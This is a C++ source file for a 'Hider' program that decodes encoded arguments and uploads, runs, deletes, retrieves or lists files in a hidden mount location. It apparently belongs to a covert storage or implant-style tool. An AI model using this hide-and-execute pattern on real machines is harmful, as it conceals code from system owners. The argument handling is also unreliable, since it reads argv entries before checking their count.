#include "Hider.h"


Hider::Hider() : handel(HiddenFileHandler()) {}



// argv[] = {fncode, uploadLen, strParam};
uint Hider::manage_files(int argc, char* argv[])
{
	std::string line;
	std::cerr << "hider argc: " << argc << std::endl;
	std::cerr << "hider argv[0]: " << argv[0] << std::endl;
	std::cerr << "hider argv[1]: " << argv[1] << std::endl;
	std::cerr << "hider argv[2]: " << argv[2] << std::endl;
	std::cerr << "hider argv[3]: " << argv[3] << std::endl;
	std::cerr << "hider argv[3]: " << argv[4] << std::endl;

	if (argc < 5) {
		return HIDER_NO_ARGUMENTS_ERROR;
	}
	uint32_t fncode = decodeInt(std::string(argv[0]));
	uint32_t uploadLen = decodeInt(std::string(argv[1]));
	std::string stringParam = decodeStr(std::string(argv[2]));
	std::string mountPath = decodeStr(std::string(argv[3]));
	uint32_t writeMode = decodeInt(std::string(argv[4]));

	std::cout << "Setting mount path." << std::endl;
	handel.setFolderName(mountPath);

	// TODO better Status handling
	responce res_upload = {.dataLen = (uint32_t)0, .status = (uint32_t)SUCCSESS};
	responce res_run = {.dataLen = (uint32_t)0, .status = (uint32_t)SUCCSESS};
	responce res_delete = {.dataLen = (uint32_t)0, .status = (uint32_t)SUCCSESS};

	std::cerr << "starting hidden action" << std::endl;
	if (fncode & HIDDEN_UPLOAD)
	{
		std::cerr << "start hidden uploading\n";
		res_upload.status = (uint32_t)handel.uploadFile(stringParam, uploadLen, writeMode);
		std::cerr << "res_upload: " << res_upload.status << std::endl;

	}
	if ((fncode & HIDDEN_RUN) && res_upload.status == SUCCSESS) {
		std::cerr << "start hidden run\n";
		res_run.status = (uint32_t)handel.runFile(stringParam);
		std::cerr << "res_run: " << res_run.status << std::endl;
	}

	if ((fncode & HIDDEN_DELETE) && res_upload.status == SUCCSESS) {
		std::cerr << "start hidden delete\n";
		res_delete.status = (uint32_t)handel.deleteFile(stringParam);
		std::cerr << "res_delete: " << res_delete.status << std::endl;
	}
	if (fncode & (HIDDEN_UPLOAD | HIDDEN_RUN | HIDDEN_DELETE))
	{
		write(STDOUT_FILENO, &res_upload, sizeof(res_upload));
		write(STDOUT_FILENO, &res_run, sizeof(res_run));
		write(STDOUT_FILENO, &res_delete, sizeof(res_delete));
	}

	if(fncode & HIDDEN_RETRIEVE_FILE) {
		handel.retreiveFile(stringParam);
	}

	if (fncode & HIDDEN_LIST) {
		handel.listFiles();
	}


	return EXIT_SUCCESS;
}


int main(int argc, char* argv[]) {
	std::cerr << "start hider\n";
	Hider hider = Hider();	
	return hider.manage_files(argc, argv);
}

